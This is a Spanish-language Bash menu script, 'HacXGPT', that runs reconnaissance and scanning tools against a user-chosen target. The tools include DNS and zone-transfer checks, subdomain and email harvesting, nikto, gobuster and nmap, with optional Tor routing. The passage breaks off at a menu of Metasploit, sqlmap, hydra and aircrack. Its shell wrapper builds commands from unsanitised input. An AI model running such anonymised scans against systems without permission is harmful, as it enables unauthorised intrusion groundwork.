#!/bin/bash
# HACXGPT v8.1 EXPERTO — MITRE ATT&CK FRAMEWORK COMPLETO

# Cargar datos MITRE ATT&CK (matrices, tácticas, APTs, CVEs)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/data/mitre_registry.sh" ]]; then
    source "$SCRIPT_DIR/data/mitre_registry.sh"
else
    echo -e "\e[1;33m⚠️  data/mitre_registry.sh no encontrado.\e[0m"
fi

# Cargar validaciones de seguridad (confirm_risk, etc.)
if [ -f "$SCRIPT_DIR/core/guarden.sh" ]; then
    source "$SCRIPT_DIR/core/guarden.sh"
    set +e +u 2>/dev/null || true
fi

# Cargar deteccion de plataforma y host Ollama
if [ -f "$SCRIPT_DIR/core/platform.sh" ]; then
    source "$SCRIPT_DIR/core/platform.sh"
fi

# Cargar integracion Ollama
if [ -f "$SCRIPT_DIR/ollama_integration.sh" ]; then
    source "$SCRIPT_DIR/ollama_integration.sh"
fi

# Cargar tracker de tecnicas MITRE
if [ -f "$SCRIPT_DIR/track_technique.sh" ]; then
    source "$SCRIPT_DIR/track_technique.sh"
fi

# ============================================
# MEJORA 4: Manejo de errores con trap
# ============================================
trap 'echo -e "\n\e[0;31m⚠️  Script interrumpido. Saliendo...\e[0m"; exit 1' INT TERM
# trap 'exit_code=$?; if [ $exit_code -ne 0 ]; then echo -e "\e[0;31m⚠️  Error inesperado (código: $exit_code)\e[0m"; fi' ERR

# ============================================
# MEJORA 1: Colores usando \e en lugar de \033
# ============================================
RED='\e[0;31m'
GREEN='\e[0;32m'
YELLOW='\e[1;33m'
BLUE='\e[0;34m'
PURPLE='\e[0;35m'
CYAN='\e[0;36m'
NC='\e[0m' # No Color

# ============================================
# SISTEMA DE OBJETIVO GLOBAL
# ============================================
TARGET=""       # Objetivo global persistente (IP o dominio)

# ============================================
# MEJORA 6: Variables para guardar resultados
# ============================================
SAVE_MODE=false
OUTPUT_FILE="hacxgpt_$(date +%Y%m%d_%H%M%S).log"

# ============================================
# MODO ANONIMO (proxychains + Tor)
# ============================================
ANON_MODE=false

# Ejecuta un comando con proxychains si ANON_MODE=true
anon_exec() {
    local cmd="$1"
    if [[ "$ANON_MODE" == true ]]; then
        proxychains -q bash -c "$cmd" 2>&1
    else
        bash -c "$cmd" 2>&1
    fi
}

# Valida que el string sea una IP o un dominio válido
validar_objetivo() {
    local obj="$1"
    local ip_regex='^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'
    local dom_regex='^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    [[ "$obj" =~ $ip_regex || "$obj" =~ $dom_regex ]]
}

# Pregunta (o reutiliza) el objetivo global antes de entrar a un módulo
preguntar_objetivo() {
    if [[ -n "$TARGET" ]]; then
        echo ""
        read -p "🎯 Usar objetivo actual [${CYAN}$TARGET${NC}]? (s/n): " _resp
        [[ "${_resp,,}" != "n" ]] && return 0
    fi
    echo ""
    while true; do
        read -p "🎯 Introduce objetivo (IP o dominio): " _nuevo
        if validar_objetivo "$_nuevo"; then
            TARGET="$_nuevo"
            OUTPUT_FILE="hacxgpt_${TARGET}_$(date +%Y%m%d_%H%M%S).log"
            echo -e "${GREEN}✅ Objetivo establecido: ${CYAN}$TARGET${NC}"
            echo ""
            return 0
        fi
        echo -e "${RED}❌ Formato inválido. Usa IP (ej: 192.168.1.1) o dominio (ej: ejemplo.com)${NC}"
    done
}

save_output() {
    local content="$1"
    if [[ "$SAVE_MODE" == true ]]; then
        echo -e "$content" | sed 's/\\e\[[0-9;]*m//g' >> "$OUTPUT_FILE"
    fi
}


# ============================================
# MEJORA 2: Validar herramientas instaladas
# ============================================
check_command() {
    local cmd="$1"
    local install_cmd="${2:-}"
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${RED}❌ '$cmd' no está instalado.${NC}"

        # Detección de sistema basado en Debian/Ubuntu (APT)
        if [ -f /etc/debian_version ] || command -v apt &>/dev/null; then
            local stamp_file="/var/lib/apt/periodic/update-success-stamp"
            local need_apt_update=false

            if [ -f "$stamp_file" ]; then
                local now_sec
                now_sec=$(date +%s 2>/dev/null || echo 0)
                local stamp_sec
                stamp_sec=$(stat -c %Y "$stamp_file" 2>/dev/null || stat -f %m "$stamp_file" 2>/dev/null || echo 0)
                local age=$(( now_sec - stamp_sec ))
                if (( age > 86400 || age < 0 )); then
                    need_apt_update=true
                fi
            else
                need_apt_update=true
            fi

            if [ "$need_apt_update" = true ]; then
                echo -e "${YELLOW}⚠️  Tu lista de paquetes puede estar desactualizada, corré 'sudo apt update' primero.${NC}"
            fi
        fi

        if [ -n "$install_cmd" ]; then
            echo -e "${YELLOW}💡 Sugerencia de instalación:${NC} $install_cmd"
        else
            echo -e "${YELLOW}💡 Sugerencia de instalación:${NC} sudo apt install $cmd"
        fi
        return 1
    fi
    return 0
}

# ============================================
# MEJORA 3: Validar dominio e IP
# ============================================
validate_domain() {
    local domain="$1"
    if [[ ! "$domain" =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$ ]]; then
        echo -e "${RED}❌ Dominio inválido: '$domain'${NC}"
        return 1
    fi
    return 0
}

validate_ip() {
    local ip="$1"
    if [[ ! "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        echo -e "${RED}❌ IP inválida: '$ip'${NC}"
        return 1
    fi
    IFS='.' read -ra octets <<< "$ip"
    for oct in "${octets[@]}"; do
        if (( oct > 255 )); then
            echo -e "${RED}❌ IP inválida (octeto fuera de rango): '$ip'${NC}"
            return 1
        fi
    done
    return 0
}

clear_screen() {
    clear
}

show_banner() {
    clear_screen
    echo ""
    echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║           ${CYAN}🛡️ HacXGPT v8.1 EXPERTO${PURPLE}              ║${NC}"
    echo -e "${PURPLE}║      ${GREEN}MITRE ATT&CK ENTERPRISE FRAMEWORK${PURPLE}        ║${NC}"
    echo -e "${PURPLE}║      ${YELLOW}RED TEAM · BLUE TEAM · PURPLE TEAM${PURPLE}       ║${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ============================================
# 1. RECONOCIMIENTO BÁSICO (IMPLEMENTADO)
# ============================================
reconocimiento_basico() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║         ${GREEN}🎯 RECONOCIMIENTO BÁSICO${CYAN}            ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}🔍 HERRAMIENTAS DE RECONOCIMIENTO:${NC}"
        echo ""
        echo "1. Información WHOIS de dominio"
        echo "2. Consultas DNS (nslookup)"
        echo "3. Consultas DNS avanzadas (dig)"
        echo "4. Buscar subdominios"
        echo "5. Información de IP"
        echo "6. Búsqueda de emails"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                read -p "🌐 Dominio para WHOIS [default: ${TARGET:-ejemplo.com}]: " dominio
                dominio="${dominio:-$TARGET}"
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando: whois $dominio${NC}"
                    echo ""
                    output=""
                    if command -v whois &>/dev/null; then
                        output=$(whois "$dominio" 2>&1 | head -60)
                    else
                        echo -e "${CYAN}ℹ️ 'whois' no disponible localmente; consultando servidor RDAP REST...${NC}"
                        output=$(anon_exec "curl -s 'https://rdap.org/domain/$dominio'" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    print(f'Domain: {d.get(\"ldhName\", \"N/A\")}')
    print(f'Handle: {d.get(\"handle\", \"N/A\")}')
    print(f'Status: {d.get(\"status\", [])}')
    events = {e.get(\"eventAction\"): e.get(\"eventDate\") for e in d.get(\"events\", [])}
    print(f'Created: {events.get(\"registration\", \"N/A\")}')
    print(f'Updated: {events.get(\"last changed\", \"N/A\")}')
    print(f'Expires: {events.get(\"expiration\", \"N/A\")}')
except Exception as e:
    print('Error al obtener datos RDAP.')
" 2>/dev/null)
                    fi
                    echo "$output"
                    save_output "[WHOIS $dominio]\n$output"
                    type track_technique &>/dev/null && track_technique "T1592" "Gather Victim Host Information (WHOIS)"
                fi
                ;;
            2)
                read -p "🌐 Dominio para NSLOOKUP [default: ${TARGET:-ejemplo.com}]: " dominio
                dominio="${dominio:-$TARGET}"
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando: nslookup $dominio${NC}"
                    echo ""
                    if command -v nslookup &>/dev/null; then
                        output=$(nslookup "$dominio" 2>&1)
                    else
                        echo -e "${CYAN}ℹ️ 'nslookup' no disponible; ejecutando resolución host...${NC}"
                        output=$(host "$dominio" 2>&1)
                    fi
                    echo "$output"
                    save_output "[NSLOOKUP $dominio]\n$output"
                    type track_technique &>/dev/null && track_technique "T1590" "Gather Victim Network Information (DNS)"
                fi
                ;;
            3)
                read -p "🌐 Dominio para DIG [default: ${TARGET:-ejemplo.com}]: " dominio
                dominio="${dominio:-$TARGET}"
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando: dig $dominio (Registros ANY, A, MX, NS, TXT)${NC}"
                    echo ""
                    if command -v dig &>/dev/null; then
                        output=$(dig "$dominio" ANY +noall +answer 2>&1)
                        if [[ -z "$output" ]]; then
                            output=$(dig "$dominio" A AAAA MX NS TXT +short 2>&1)
                        fi
                        echo -e "${GREEN}--- Respuesta DNS ---${NC}"
                        echo "$output"
                        
                        echo ""
                        echo -e "${YELLOW}🔍 Verificando Transferencia de Zona (AXFR)...${NC}"
                        ns_servers=$(dig "$dominio" NS +short)
                        for ns in $ns_servers; do
                            axfr_res=$(dig AXFR "$dominio" "@$ns" +short 2>&1)
                            if [[ -n "$axfr_res" && "$axfr_res" != *"failed"* && "$axfr_res" != *"refused"* ]]; then
                                echo -e "${RED}⚠️ Transferencia de Zona PERMITIDA en $ns:${NC}\n$axfr_res"
                            else
                                echo -e "${GREEN}✅ AXFR denegado en $ns${NC}"
                            fi
                        done
                    else
                        echo -e "${CYAN}ℹ️ 'dig' no disponible; ejecutando nslookup -type=any...${NC}"
                        output=$(nslookup -type=any "$dominio" 2>&1)
                        echo "$output"
                    fi
                    save_output "[DIG $dominio]\n$output"
                    type track_technique &>/dev/null && track_technique "T1590.002" "DNS Enumeration (DIG/AXFR)"
                fi
                ;;
            4)
                read -p "🌐 Dominio para buscar subdominios [default: ${TARGET:-ejemplo.com}]: " dominio
                dominio="${dominio:-$TARGET}"
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando búsqueda real de subdominios para $dominio...${NC}"
                    echo ""
                    
                    found_subs=()
                    
                    if command -v subfinder &>/dev/null; then
                        echo -e "${CYAN}▶ Ejecutando subfinder...${NC}"
                        mapfile -t subs_sf < <(subfinder -d "$dominio" -silent 2>/dev/null)
                        found_subs+=("${subs_sf[@]}")
                    fi
                    
                    if command -v assetfinder &>/dev/null; then
                        echo -e "${CYAN}▶ Ejecutando assetfinder...${NC}"
                        mapfile -t subs_af < <(assetfinder --subs-only "$dominio" 2>/dev/null)
                        found_subs+=("${subs_af[@]}")
                    fi
                    
                    echo -e "${CYAN}▶ Consultando registros de certificados SSL/TLS (CRT.sh)...${NC}"
                    crt_subs=$(curl -s "https://crt.sh/?q=%25.$dominio&output=json" 2>/dev/null | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    subs = set()
    for entry in data:
        name = entry.get('name_value', '')
        for s in name.split('\n'):
            s = s.strip()
            if s and not s.startswith('*'):
                subs.add(s)
    for s in sorted(subs):
        print(s)
except Exception:
    pass
" 2>/dev/null)

                    if [[ -n "$crt_subs" ]]; then
                        while IFS= read -r line; do
                            [[ -n "$line" ]] && found_subs+=("$line")
                        done <<< "$crt_subs"
                    fi

                    if [ ${#found_subs[@]} -gt 0 ]; then
                        unique_subs=$(printf "%s\n" "${found_subs[@]}" | sort -u)
                        count=$(echo "$unique_subs" | grep -c .)
                        echo ""
                        echo -e "${GREEN}✅ Encontrados $count subdominios para $dominio:${NC}"
                        echo "$unique_subs" | sed 's/^/  • /'
                        save_output "[SUBDOMINIOS $dominio]\n$unique_subs"
                    else
                        echo -e "${YELLOW}⚠️ No se hallaron subdominios públicos en CRT.sh ni herramientas locales.${NC}"
                    fi
                    
                    type track_technique &>/dev/null && track_technique "T1595" "Active Scanning / Subdomain Enumeration"
                fi
                ;;
            5)
                read -p "📡 Dirección IP/Dominio para información [default: ${TARGET:-8.8.8.8}]: " ip
                ip="${ip:-$TARGET}"
                if [ -n "$ip" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando análisis de IP y geolocalización para $ip...${NC}"
                    echo ""
                    
                    echo -e "${CYAN}▶ Geolocalización e info de red (ipinfo.io):${NC}"
                    geo_data=$(curl -s "https://ipinfo.io/$ip/json" 2>/dev/null)
                    if [[ -n "$geo_data" && "$geo_data" != *"error"* ]]; then
                        echo "$geo_data" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    print(f'  • IP:           {d.get(\"ip\", \"N/A\")}')
    print(f'  • Hostname:     {d.get(\"hostname\", \"N/A\")}')
    print(f'  • Ciudad:       {d.get(\"city\", \"N/A\")}')
    print(f'  • Región:       {d.get(\"region\", \"N/A\")}')
    print(f'  • País:         {d.get(\"country\", \"N/A\")}')
    print(f'  • Organización: {d.get(\"org\", \"N/A\")}')
    print(f'  • Coordenadas:  {d.get(\"loc\", \"N/A\")}')
except Exception:
    pass
" 2>/dev/null
                    fi
                    
                    echo ""
                    echo -e "${CYAN}▶ Conectividad ICMP (ping):${NC}"
                    if command -v ping &>/dev/null; then
                        ping -c 4 "$ip" 2>&1 || ping -n 4 "$ip" 2>&1
                    fi

                    echo ""
                    echo -e "${CYAN}▶ Registro WHOIS de IP:${NC}"
                    if command -v whois &>/dev/null; then
                        whois "$ip" 2>&1 | grep -iE 'netname|orgname|country|cidr|origin|descr' | head -15 | sed 's/^/  /'
                    fi

                    save_output "[INFO IP $ip]\n$geo_data"
                    type track_technique &>/dev/null && track_technique "T1590.005" "IP Addresses Information"
                fi
                ;;
            6)
                read -p "📧 Dominio para buscar emails [default: ${TARGET:-ejemplo.com}]: " dominio
                dominio="${dominio:-$TARGET}"
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Buscando cuentas de correo e infraestructura de email para $dominio...${NC}"
                    echo ""
                    
                    if command -v theHarvester &>/dev/null; then
                        echo -e "${CYAN}▶ Ejecutando theHarvester...${NC}"
                        theHarvester -d "$dominio" -b google 2>/dev/null | grep -i "@$dominio"
                    fi
                    
                    echo -e "${CYAN}▶ Extrayendo identidades de correo en certificados SSL públicos (CRT.sh)...${NC}"
                    curl -s "https://crt.sh/?q=%25.$dominio&output=json" 2>/dev/null | python3 -c "
import sys, json, re
try:
    data = json.load(sys.stdin)
    emails = set()
    dom = '$dominio'
    pattern = re.compile(r'[a-zA-Z0-9._%+-]+@' + re.escape(dom), re.IGNORECASE)
    for entry in data:
        val = str(entry)
        for e in pattern.findall(val):
            emails.add(e.lower())
    if emails:
        print('  ✅ Emails identificados en certificados:')
        for email in sorted(emails):
            print(f'     • {email}')
    else:
        print('  ℹ️ No se hallaron emails en certificados SSL públicos.')
except Exception:
    pass
" 2>/dev/null

                    echo ""
                    echo -e "${CYAN}▶ Servidores de correo (MX) y Políticas (SPF/DMARC):${NC}"
                    if command -v dig &>/dev/null; then
                        echo -e "  📌 Servidores MX:"
                        dig "$dominio" MX +short | sed 's/^/     • /'
                        echo -e "  📌 Registro SPF (TXT):"
                        dig "$dominio" TXT +short | grep -i "spf" | sed 's/^/     • /'
                        echo -e "  📌 Registro DMARC (_dmarc.$dominio):"
                        dig "_dmarc.$dominio" TXT +short | sed 's/^/     • /'
                    else
                        nslookup -type=mx "$dominio" 2>&1 | sed 's/^/     /'
                    fi

                    save_output "[EMAIL RECON $dominio]"
                    type track_technique &>/dev/null && track_technique "T1589" "Gather Victim Identity Information (Emails)"
                fi
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 2. ESCANEO WEB (IMPLEMENTADO)
# ============================================
escaneo_web() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║            ${GREEN}🌐 ESCANEO WEB${CYAN}                   ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}🛠️ HERRAMIENTAS DE ESCANEO WEB:${NC}"
        echo ""
        echo "1. Detectar tecnologías (whatweb)"
        echo "2. Escanear vulnerabilidades (nikto)"
        echo "3. Buscar directorios (gobuster/dirb/ffuf)"
        echo "4. Analizar headers HTTP (curl)"
        echo "5. Probar métodos HTTP (OPTIONS/curl/nmap)"
        echo "6. SSL/TLS análisis (sslscan/testssl/openssl)"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                read -p "🌐 URL para whatweb [default: https://${TARGET:-ejemplo.com}]: " url
                url="${url:-https://$TARGET}"
                if [ -n "$url" ]; then
                    if check_command whatweb; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: whatweb $url${NC}"
                        echo ""
                        output=$(anon_exec "whatweb '$url'" 2>&1)
                        echo "$output"
                        save_output "[WHATWEB $url]\n$output"
                        type track_technique &>/dev/null && track_technique "T1592" "Gather Victim Host Information (WhatWeb)"
                    else
                        echo -e "${YELLOW}💡 Para instalar whatweb:${NC} sudo apt install whatweb"
                    fi
                fi
                ;;
            2)
                read -p "🌐 URL para nikto [default: https://${TARGET:-ejemplo.com}]: " url
                url="${url:-https://$TARGET}"
                if [ -n "$url" ]; then
                    if check_command nikto; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: nikto -h $url${NC}"
                        echo ""
                        output=$(anon_exec "nikto -h '$url'" 2>/dev/null)
                        echo "$output"
                        save_output "[NIKTO $url]\n$output"
                        type track_technique &>/dev/null && track_technique "T1595" "Active Scanning / Web Vulnerability Scan (Nikto)"
                    else
                        echo -e "${YELLOW}💡 Para instalar nikto:${NC} sudo apt install nikto"
                    fi
                fi
                ;;
            3)
                read -p "🌐 URL para buscar directorios [default: https://${TARGET:-ejemplo.com}]: " url
                url="${url:-https://$TARGET}"
                if [ -n "$url" ]; then
                    echo ""
                    if check_command "gobuster" "sudo apt install gobuster"; then
                        read -p "📖 Ruta Wordlist [default: /usr/share/wordlists/dirb/common.txt]: " wl_val
                        wl_val="${wl_val:-/usr/share/wordlists/dirb/common.txt}"
                        if [[ -f "$wl_val" ]]; then
                            echo -e "${YELLOW}🔍 Ejecutando: gobuster dir -u $url -w $wl_val${NC}"
                            echo ""
                            output=$(anon_exec "gobuster dir -u '$url' -w '$wl_val' -q" 2>&1 | head -50)
                        else
                            echo -e "${YELLOW}⚠️ Wordlist no encontrada en $wl_val. Ejecutando gobuster con wordlist reducida...${NC}"
                            output=$(anon_exec "gobuster dir -u '$url' -w /tmp/hacxgpt_wl_$$.txt -q" 2>&1)
                        fi
                        echo "$output"
                        save_output "[GOBUSTER $url]\n$output"
                        type track_technique &>/dev/null && track_technique "T1083" "File and Directory Discovery (Gobuster)"
                    elif command -v dirb &>/dev/null; then
                        echo -e "${YELLOW}🔍 Ejecutando: dirb $url${NC}"
                        echo ""
                        output=$(dirb "$url" 2>&1 | head -50)
                        echo "$output"
                        save_output "[DIRB $url]\n$output"
                        type track_technique &>/dev/null && track_technique "T1083" "File and Directory Discovery (Dirb)"
                    fi
                fi
                ;;
            4)
                read -p "🌐 URL para analizar headers [default: https://${TARGET:-ejemplo.com}]: " url
                url="${url:-https://$TARGET}"
                if [ -n "$url" ]; then
                    if check_command curl; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: curl -I -L $url${NC}"
                        echo ""
                        output=$(anon_exec "curl -I -L '$url'" 2>&1)
                        echo "$output"
                        save_output "[HEADERS $url]\n$output"
                        type track_technique &>/dev/null && track_technique "T1592" "Gather Victim Host Information (HTTP Headers)"
                    else
                        echo -e "${YELLOW}💡 Para instalar curl:${NC} sudo apt install curl"
                    fi
                fi
                ;;
            5)
                read -p "🌐 URL para probar métodos HTTP [default: https://${TARGET:-ejemplo.com}]: " url
                url="${url:-https://$TARGET}"
                if [ -n "$url" ]; then
                    if check_command curl; then
                        echo ""
                        echo -e "${YELLOW}🔍 Probando métodos HTTP (OPTIONS, TRACE, PUT, DELETE) con curl en $url...${NC}"
                        echo ""
                        output=""
                        output+="--- Petición OPTIONS ---\n"
                        output+=$(curl -i -s -X OPTIONS "$url" | head -20)
                        output+="\n\n--- Petición TRACE ---\n"
                        output+=$(curl -i -s -X TRACE "$url" | head -15)
                        
                        if command -v nmap &>/dev/null; then
                            echo -e "${CYAN}▶ Ejecutando script nmap http-methods...${NC}"
                            nmap_methods=$(nmap --script http-methods "$TARGET" 2>&1)
                            output+="\n\n--- Nmap HTTP Methods ---\n$nmap_methods"
                        fi
                        
                        echo -e "$output"
                        save_output "[HTTP METHODS $url]\n$output"
                        type track_technique &>/dev/null && track_technique "T1592" "Gather Victim Host Information (HTTP Methods)"
                    else
                        echo -e "${YELLOW}💡 Para instalar curl:${NC} sudo apt install curl"
                    fi
                fi
                ;;
            6)
                read -p "🌐 Dominio/Host para análisis SSL [default: ${TARGET:-ejemplo.com}]: " dominio
                dominio="${dominio:-$TARGET}"
                if [ -n "$dominio" ]; then
                    echo ""
                    output=""
                    if command -v sslscan &>/dev/null; then
                        echo -e "${YELLOW}🔍 Ejecutando: sslscan $dominio${NC}"
                        echo ""
                        output=$(anon_exec "sslscan --no-failed '$dominio'" 2>&1)
                    elif command -v testssl.sh &>/dev/null || command -v testssl &>/dev/null; then
                        testssl_cmd=$(command -v testssl.sh || command -v testssl)
                        echo -e "${YELLOW}🔍 Ejecutando: $testssl_cmd $dominio${NC}"
                        echo ""
                        output=$($testssl_cmd --fast "$dominio" 2>&1 | head -60)
                    elif command -v openssl &>/dev/null; then
                        echo -e "${CYAN}ℹ️ 'sslscan' no instalado; ejecutando inspección de certificado con OpenSSL...${NC}"
                        output=$(echo | openssl s_client -connect "$dominio:443" -servername "$dominio" 2>&1 | openssl x509 -noout -text 2>&1 | head -40)
                    else
                        echo -e "${RED}❌ Ninguna herramienta de SSL instalada (sslscan, testssl, openssl).${NC}"
                        echo -e "${YELLOW}💡 Para instalar sslscan:${NC} sudo apt install sslscan"
                    fi

                    if [[ -n "$output" ]]; then
                        echo "$output"
                        save_output "[SSL SCAN $dominio]\n$output"
                        type track_technique &>/dev/null && track_technique "T1590" "Gather Victim Network Information (SSL/TLS)"
                    fi
                fi
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 3. ANÁLISIS DE RED (IMPLEMENTADO)
# ============================================
analisis_red() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║           ${GREEN}📡 ANÁLISIS DE RED${CYAN}                ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}📊 HERRAMIENTAS DE ANÁLISIS DE RED:${NC}"
        echo ""
        echo "1. Escaneo básico de puertos (nmap -F)"
        echo "2. Escaneo avanzado de servicios (nmap -sV -sC)"
        echo "3. Ping a objetivo"
        echo "4. Traceroute a objetivo"
        echo "5. Netstat (conexiones locales)"
        echo "6. Capturar tráfico (tcpdump)"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                read -p "🎯 Objetivo para nmap básico [default: ${TARGET:-127.0.0.1}]: " objetivo
                objetivo="${objetivo:-$TARGET}"
                if [ -n "$objetivo" ]; then
                    if check_command nmap; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: nmap -F $objetivo${NC}"
                        echo ""
                        output=$(anon_exec "nmap -F '$objetivo'" 2>&1)
                        echo "$output"
                        save_output "[NMAP BASIC $objetivo]\n$output"
                        type track_technique &>/dev/null && track_technique "T1046" "Network Service Scanning (Nmap Quick)"
                    else
                        echo -e "${YELLOW}💡 Para instalar nmap:${NC} sudo apt install nmap"
                    fi
                fi
                ;;
            2)
                read -p "🎯 Objetivo para escaneo avanzado [default: ${TARGET:-127.0.0.1}]: " objetivo
                objetivo="${objetivo:-$TARGET}"
                if [ -n "$objetivo" ]; then
                    if check_command nmap; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: nmap -sV -sC -T4 $objetivo${NC}"
                        echo ""
                        output=$(anon_exec "nmap -sV -sC -T4 '$objetivo'" 2>&1)
                        echo "$output"
                        save_output "[NMAP ADVANCED $objetivo]\n$output"
                        type track_technique &>/dev/null && track_technique "T1046" "Network Service Scanning (Nmap Advanced)"
                    else
                        echo -e "${YELLOW}💡 Para instalar nmap:${NC} sudo apt install nmap"
                    fi
                fi
                ;;
            3)
                read -p "🎏 Objetivo para ping [default: ${TARGET:-8.8.8.8}]: " objetivo
                objetivo="${objetivo:-$TARGET}"
                if [ -n "$objetivo" ]; then
                    if check_command ping; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: ping -c 4 $objetivo${NC}"
                        echo ""
                        output=$(ping -c 4 "$objetivo" 2>&1 || ping -n 4 "$objetivo" 2>&1)
                        echo "$output"
                        save_output "[PING $objetivo]\n$output"
                        type track_technique &>/dev/null && track_technique "T1018" "Remote System Discovery (Ping)"
                    else
                        echo -e "${YELLOW}💡 Para instalar ping:${NC} sudo apt install iputils-ping"
                    fi
                fi
                ;;
            4)
                read -p "🎯 Objetivo para traceroute [default: ${TARGET:-8.8.8.8}]: " objetivo
                objetivo="${objetivo:-$TARGET}"
                if [ -n "$objetivo" ]; then
                    echo ""
                    output=""
                    if command -v traceroute &>/dev/null; then
                        echo -e "${YELLOW}🔍 Ejecutando: traceroute $objetivo${NC}"
                        echo ""
                        output=$(traceroute "$objetivo" 2>&1)
                    elif command -v tracert &>/dev/null; then
                        echo -e "${YELLOW}🔍 Ejecutando: tracert $objetivo${NC}"
                        echo ""
                        output=$(tracert "$objetivo" 2>&1)
                    elif command -v mtr &>/dev/null; then
                        echo -e "${YELLOW}🔍 Ejecutando: mtr --report -c 5 $objetivo${NC}"
                        echo ""
                        output=$(mtr --report -c 5 "$objetivo" 2>&1)
                    else
                        echo -e "${RED}❌ Ni traceroute, ni tracert, ni mtr están disponibles en este sistema.${NC}"
                        echo -e "${YELLOW}💡 Para instalar traceroute:${NC} sudo apt install traceroute"
                    fi

                    if [[ -n "$output" ]]; then
                        echo "$output"
                        save_output "[TRACEROUTE $objetivo]\n$output"
                        type track_technique &>/dev/null && track_technique "T1016" "System Network Configuration Discovery (Traceroute)"
                    fi
                fi
                ;;
            5)
                echo ""
                echo -e "${YELLOW}🔍 Consultando conexiones activas y puertos escuchando localmente...${NC}"
                echo ""
                output=""
                if command -v netstat &>/dev/null; then
                    output=$(netstat -tulpn 2>/dev/null || netstat -an 2>/dev/null | head -40)
                elif command -v ss &>/dev/null; then
                    output=$(ss -tulpn 2>/dev/null || ss -an 2>/dev/null | head -40)
                else
                    echo -e "${RED}❌ Ni netstat ni ss están disponibles.${NC}"
                    echo -e "${YELLOW}💡 Para instalar netstat:${NC} sudo apt install net-tools"
                fi

                if [[ -n "$output" ]]; then
                    echo "$output"
                    save_output "[NETSTAT LOCAL]\n$output"
                    type track_technique &>/dev/null && track_technique "T1049" "System Network Connections Discovery (Netstat)"
                fi
                ;;
            6)
                read -p "🎯 Interfaz para capturar (ej: eth0) [default: any]: " interfaz
                interfaz="${interfaz:-any}"
                if [ -n "$interfaz" ]; then
                    if check_command tcpdump; then
                        echo ""
                        echo -e "${YELLOW}🔍 Capturando 20 paquetes en interfaz '$interfaz'...${NC}"
                        echo ""
                        output=$(sudo tcpdump -i "$interfaz" -c 20 2>&1)
                        echo "$output"
                        save_output "[TCPDUMP $interfaz]\n$output"
                        type track_technique &>/dev/null && track_technique "T1040" "Network Sniffing (tcpdump)"
                    else
                        echo -e "${YELLOW}💡 Para instalar tcpdump:${NC} sudo apt install tcpdump"
                    fi
                fi
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 4. SUITE DE PENTESTING (IMPLEMENTADO)
# ============================================
suite_pentesting() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║           ${GREEN}⚔️ SUITE DE PENTESTING${CYAN}            ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}🔧 HERRAMIENTAS DE PENTESTING:${NC}"
        echo ""
        echo "1. Metasploit Framework"
        echo "2. SQL Injection (sqlmap)"
        echo "3. Fuerza Bruta (hydra)"
        echo "4. XSS Testing (XSStrike)"
        echo "5. Wifi Hacking (aircrack)"
        echo "6. John The Ripper"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
